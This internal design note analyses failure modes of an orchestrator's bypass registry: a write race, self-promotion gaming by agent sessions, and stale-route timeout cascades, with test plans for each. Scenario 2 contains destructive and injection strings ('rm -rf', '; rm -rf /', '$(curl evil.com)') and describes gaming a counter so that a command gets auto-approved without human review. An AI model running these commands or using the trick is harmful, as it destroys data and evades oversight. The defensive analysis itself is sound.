# T-247: Adversarial / Failure Mode Scenarios

Lens: **Adversarial / failure mode analyst** — race conditions, promotion gaming, cascading failures.

---

## Scenario 1: Registry Write Race (Concurrent Promotion Loss)

### Trigger

Two concurrent `orchestrator.route` calls complete successfully for different commands at the same instant. Both load the bypass registry, mutate it, and write it back.

### Flow

1. Request A routes `fw audit` to specialist-1 — succeeds (5th success, promotion threshold met)
2. Request B routes `fw metrics` to specialist-2 — succeeds (5th success, promotion threshold met)
3. Request A calls `BypassRegistry::load()` — reads file at T=0, sees neither command promoted
4. Request B calls `BypassRegistry::load()` — reads same file at T=0
5. Request A calls `record_orchestrated_run("fw audit", true)` — promotes `fw audit` in its in-memory copy
6. Request A calls `save()` — writes registry with `fw audit` promoted
7. Request B calls `record_orchestrated_run("fw metrics", true)` — promotes `fw metrics` in its stale copy (which lacks `fw audit`)
8. Request B calls `save()` — overwrites file, **erasing the `fw audit` promotion**
9. `fw audit` is silently de-promoted without any failure. Its candidate stats are also gone (moved to `entries` in the lost write). On next orchestrated run, it starts from zero.

### Expected Outcome

Both promotions should persist. Concurrent registry updates must not silently discard writes.

### Current Gap

`BypassRegistry::load()` + mutate + `save()` is a classic read-modify-write race. There is no file locking, no atomic rename, no compare-and-swap. The `save_to` method uses `std::fs::write` which is not atomic on most filesystems (truncate + write, not write-to-temp + rename). Two concurrent hub request handlers (tokio tasks on the same runtime) can interleave freely.

Beyond lost writes, a crash between truncate and write completion produces a zero-byte or partial JSON file, which `load_from` silently replaces with `Default::default()` — erasing the entire registry.

### What We Learn

The bypass registry is a shared mutable resource accessed from an async runtime with no concurrency control. Every `save()` call is a potential data loss event under concurrent load. This is the most fundamental architectural weakness: **the registry has no concurrency story**.

### Test Approach

1. Register a hub and two specialist sessions
2. Send 4 successful `orchestrator.route` calls for command-A and command-B each (8 total, sequential)
3. Send the 5th call for both commands **simultaneously** (two concurrent `termlink exec` or raw RPC calls)
4. Read `bypass-registry.json` and assert both commands are in `entries`
5. Run 50 iterations to increase race window probability
6. Variant: kill the hub process mid-save (SIGKILL after truncate) and verify the registry recovers or at least does not silently reset to empty

---

## Scenario 2: Promotion Gaming (Self-Orchestrated Dummy Calls)

### Trigger

A malicious or misconfigured agent session orchestrates calls to itself (or a colluding session) specifically to hit the promotion threshold and gain Tier 3 bypass for a dangerous command.

### Flow

1. Attacker registers session "helper" with tags `["exec"]` and a handler that always returns success for any method
2. Attacker sends 5 `orchestrator.route` calls:
   ```json
   {
     "selector": {"tags": ["exec"]},
     "method": "rm -rf /tmp/important",
     "params": {}
   }
   ```
3. Each call discovers "helper", forwards to it, gets a success response
4. After 5 successes, the bypass registry promotes `rm -rf /tmp/important` to Tier 3
5. Next time the orchestrator sees this command, it returns `{"bypassed": true}` without routing to any specialist — the command is pre-approved
6. If the caller interprets `bypassed: true` as "safe to execute locally without review," the destructive command runs without human oversight

### Expected Outcome

The system should have guardrails against self-promotion:
- Commands matching a denylist (destructive patterns) should never be promotable
- The promotion path should require distinct callers or sessions (not the same agent orchestrating its own promotion)
- The `bypassed: true` response should carry metadata about what bypass means (pre-approved routing shortcut, NOT execution authorization)

### Current Gap

There are zero restrictions on what strings can be promoted. The `method` field in `orchestrator.route` is an arbitrary string — it is the bypass registry key. The promotion logic (`record_orchestrated_run`) checks only `success_count >= 5 && fail_count == 0`. It does not check:
- **Who** is requesting the orchestration (no caller identity in the promotion path)
- **What** the command string contains (no denylist, no pattern validation)
- **Whether** the specialist actually executed anything meaningful (a stub returning `{"ok": true}` counts as success)

The bypass response at lines 519-528 of `router.rs` returns `bypassed: true` and the command string. A naive consumer could treat this as execution authorization. The semantic gap between "this command has been routed successfully 5 times" and "this command is safe to run" is not surfaced anywhere in the API.

### What We Learn

The promotion mechanism has no concept of **identity** or **intent**. It is a pure counter. This makes it gameable by any session that can send RPC calls to the hub. The trust model assumes all sessions are honest, which contradicts the adversarial lens entirely. The bypass registry needs either: (a) a command allowlist/denylist, (b) caller diversity requirements, or (c) human approval for promotion events.

### Test Approach

1. Start a hub and register a "rubber-stamp" session that returns success for any method
2. From a single client, send 5 `orchestrator.route` calls with `method: "dangerous.operation"`
3. Assert that `bypass-registry.json` now contains `dangerous.operation` in entries — this proves the gaming vector exists
4. Send a 6th call and verify the response is `{"bypassed": true}` — the command is now auto-approved
5. Variant: test with `method` strings containing shell metacharacters (`; rm -rf /`, `$(curl evil.com)`) to verify no injection if the command string is ever interpolated

---

## Scenario 3: Stale Route Cascade (Specialist Cleanup Without Hub Notification)

### Trigger

A specialist session crashes (SIGKILL) or its socket file is cleaned up by `termlink clean`, but the hub's `manager::list_sessions()` still returns it because the registration file on disk has not been removed or the session list is cached.

### Flow

1. Hub is running. Specialists A, B, C are registered with tag `["linter"]`
2. Specialist A crashes (SIGKILL — no graceful deregister). Its socket file remains briefly, then is cleaned by `termlink clean` or OS tmpdir cleanup
3. Specialist B is stopped gracefully but its registration file lingers due to a race in cleanup
4. Only specialist C is actually alive
5. Orchestrator receives `orchestrator.route` with `selector: {"tags": ["linter"]}`
6. `manager::list_sessions(false)` returns all three — the `false` parameter means it does not do liveness probing
7. Route tries specialist A first — TCP/Unix connect fails after a timeout (5 seconds wasted)
8. Route tries specialist B — socket exists but nobody is listening, connection refused or timeout (5 more seconds)
9. Route finally reaches specialist C — succeeds, but the round-trip took 10+ seconds instead of <1 second
10. The **failure is recorded** for specialist A and B's attempts via `record_orchestrated_run(&method, false)` — wait, actually looking at the code, failures on connection/timeout do NOT call `record_orchestrated_run`. Only RPC-level errors (line 655) record a failure. Connection failures (line 665) and timeouts (line 673) are silently skipped in the bypass tracking.

### Expected Outcome

- Dead sessions should be detected and deprioritized or removed before routing
- Connection failures should count toward bypass tracking (they are real failures)
- Failover latency should be bounded: if 2 of 3 candidates are dead, the successful route should not take 10+ seconds
- The discovery step should optionally do a lightweight liveness check (or use cached heartbeat data)

### Current Gap

**Three distinct gaps compound here:**

1. **No liveness filtering in route discovery.** `list_sessions(false)` reads registration files from disk. A crashed session's file persists until explicit cleanup. The `true` parameter would probe liveness, but the route handler hardcodes `false` — presumably for performance, but this means every stale session costs a full timeout on the forwarding step.

2. **Silent failure tracking gap.** Connection failures (line 665-671) and timeouts (line 673-678) do not call `record_orchestrated_run`. This means: (a) a command routed through a landscape of dead sessions accumulates neither successes nor failures in the bypass registry — the counter simply does not advance, (b) there is an asymmetry: RPC-level errors count as failures, but transport-level errors do not. A command that always reaches a live specialist after 2 dead ones will eventually promote, but more slowly than expected because only the final success is counted while the preceding failures are invisible.

3. **Linear failover with fixed timeout.** With N dead candidates and a 5-second timeout each, worst-case latency is `N * 5s` before reaching a live specialist. There is no parallel probing, no circuit breaker, no exponential backoff, and no memory of which candidates failed recently.

### What We Learn

The routing layer assumes a healthy session landscape. When the landscape degrades (which is the normal state in a system with transient sessions), the failover strategy becomes a serial timeout chain. Combined with the tracking gap, the bypass registry's view of command reliability diverges from reality — it only sees the clean successes and clean RPC errors, missing the messy transport failures that dominate in degraded environments.

### Test Approach

1. Start a hub and register 5 specialist sessions with the same tag
2. Kill 4 of them with SIGKILL (leave registration files intact)
3. Time an `orchestrator.route` call — measure total latency vs. single-specialist latency
4. Assert latency is approximately `4 * timeout + success_time` (proving serial failover)
5. Check `bypass-registry.json` — verify that only 1 success is recorded (not 4 failures + 1 success)
6. Repeat 5 times and verify the command is promoted after 5 successes despite 20 transport failures being invisible
7. Variant: set `timeout_secs: 1` and verify the 4 dead candidates still cost 4 seconds total

---

## Summary of Architectural Weaknesses

| Weakness | Scenario | Severity | Fix Complexity |
|----------|----------|----------|----------------|
| No concurrency control on registry file | 1 | High — silent data loss | Medium — file lock or atomic rename |
| No crash-safe writes (truncate + write) | 1 | High — total registry loss | Low — write-to-temp + rename |
| No command validation or denylist | 2 | Medium — gameable promotion | Low — pattern allowlist |
| No caller identity in promotion | 2 | Medium — self-promotion | Medium — track caller session ID |
| No liveness check in route discovery | 3 | High — cascading timeouts | Medium — heartbeat cache or parallel probe |
| Transport failures not tracked | 3 | Medium — skewed bypass stats | Low — add `record_orchestrated_run` calls |
| Serial failover with fixed timeout | 3 | Medium — latency multiplication | Medium — parallel probe or circuit breaker |
